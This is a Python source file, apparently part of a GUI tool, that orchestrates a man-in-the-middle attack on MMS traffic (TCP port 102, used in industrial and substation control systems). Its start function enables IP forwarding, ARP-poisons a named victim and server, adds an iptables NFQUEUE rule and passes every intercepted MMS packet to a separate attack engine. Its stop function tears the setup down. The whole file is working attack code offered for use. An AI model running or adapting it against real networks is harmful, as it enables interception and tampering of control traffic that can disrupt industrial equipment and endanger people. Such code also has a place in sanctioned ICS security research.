"""
mitm.py — NFQueue handler + MITM orchestrator.

Binds to NFQUEUE 1, dispatches every intercepted MMS packet to attack_engine,
emits all log messages via the log_cb callback (fed into GUI QTextEdit via
pyqtSignal).

Run from MitmWorker QThread in the GUI — never in main thread.
"""

from __future__ import annotations
import threading
import logging
from typing import Callable, Optional

import attack_engine
from arp_poison import (
    start_arp_poison, stop_arp_poison,
    enable_ip_forward, disable_ip_forward,
    insert_nfqueue_rule, remove_nfqueue_rule,
)

logger = logging.getLogger("mitm")

_nfq_thread: Optional[threading.Thread] = None
_nfq_stop = threading.Event()
_pkt_seq = 0


# ─────────────────────────────────────────────────────────────────────────────
# NFQueue callback
# ─────────────────────────────────────────────────────────────────────────────

def nfqueue_handler(nfq_pkt) -> None:
    """
    Callback invoked by NetfilterQueue for every intercepted packet.
    Runs in the NFQ thread — must be fast; heavy work is dispatched to
    daemon threads inside attack_engine.
    """
    global _pkt_seq
    try:
        from scapy.all import IP
        raw = nfq_pkt.get_payload()
        ip_pkt = IP(raw)

        # Filter: only handle MMS TCP port 102
        if ip_pkt.haslayer("TCP"):
            tcp = ip_pkt.payload
            if tcp.sport == 102 or tcp.dport == 102:
                _pkt_seq += 1
                attack_engine.process_packet(nfq_pkt, ip_pkt, _pkt_seq)
                return

        # Not MMS — pass through
        nfq_pkt.accept()

    except Exception as e:
        logger.error(f"nfqueue_handler error: {e}")
        try:
            nfq_pkt.accept()
        except Exception:
            pass


# ─────────────────────────────────────────────────────────────────────────────
# NFQ bind / run (blocking loop — runs in dedicated thread)
# ─────────────────────────────────────────────────────────────────────────────

def _nfq_run(queue_num: int, stop_event: threading.Event,
             log_cb: Callable[[str], None]) -> None:
    try:
        from netfilterqueue import NetfilterQueue
    except ImportError:
        log_cb("[NFQ] ERROR: netfilterqueue not installed — pip install netfilterqueue")
        return

    nfq = NetfilterQueue()
    try:
        nfq.bind(queue_num, nfqueue_handler)
        log_cb(f"[NFQ] Bound to NFQUEUE {queue_num} — awaiting MMS packets")
        # run() blocks; we run it in a thread and use stop_event + socket trick
        import socket
        s = nfq.get_fd()
        import select
        while not stop_event.is_set():
            rlist, _, _ = select.select([s], [], [], 1.0)
            if rlist:
                nfq.run(block=False)
    except Exception as e:
        log_cb(f"[NFQ] ERROR: {e}")
    finally:
        try:
            nfq.unbind()
        except Exception:
            pass
        log_cb("[NFQ] Unbound from queue")


# ─────────────────────────────────────────────────────────────────────────────
# Public start / stop API (called by GUI MitmWorker)
# ─────────────────────────────────────────────────────────────────────────────

def start_mitm(
    victim_ip: str,
    server_ip: str,
    iface: str,
    queue_num: int = 1,
    mms_port: int = 102,
    log_cb: Callable[[str], None] = print,
) -> None:
    """
    Full MITM setup:
      1. Enable IP forwarding
      2. Start ARP poisoning
      3. Insert iptables NFQUEUE rule
      4. Bind NFQ and run handler loop
    Meant to be called inside a QThread.
    """
    global _nfq_thread, _nfq_stop, _pkt_seq
    _pkt_seq = 0

    # Set log callback in attack engine
    attack_engine.set_log_callback(log_cb)

    log_cb("[MITM] === Establishing MITM ===")

    # 1. IP forward
    log_cb(enable_ip_forward())

    # 2. ARP poison
    log_cb(start_arp_poison(victim_ip, server_ip, iface, log_cb=log_cb))

    # 3. iptables
    log_cb(insert_nfqueue_rule(queue_num=queue_num, port=mms_port))

    # 4. NFQ bind (blocking)
    _nfq_stop = threading.Event()
    log_cb(f"[NFQ] Starting NFQueue handler on queue {queue_num}...")
    _nfq_run(queue_num, _nfq_stop, log_cb)


def stop_mitm(
    queue_num: int = 1,
    mms_port: int = 102,
    log_cb: Callable[[str], None] = print,
) -> None:
    """
    Tear down MITM:
      1. Stop NFQ loop
      2. Remove iptables rules
      3. Stop ARP poisoning (restores ARP tables)
      4. Disable IP forwarding
    """
    global _nfq_stop

    log_cb("[MITM] === Stopping MITM ===")

    _nfq_stop.set()
    log_cb(remove_nfqueue_rule(queue_num=queue_num, port=mms_port))
    log_cb(stop_arp_poison())
    log_cb(disable_ip_forward())
    log_cb("[MITM] Teardown complete")
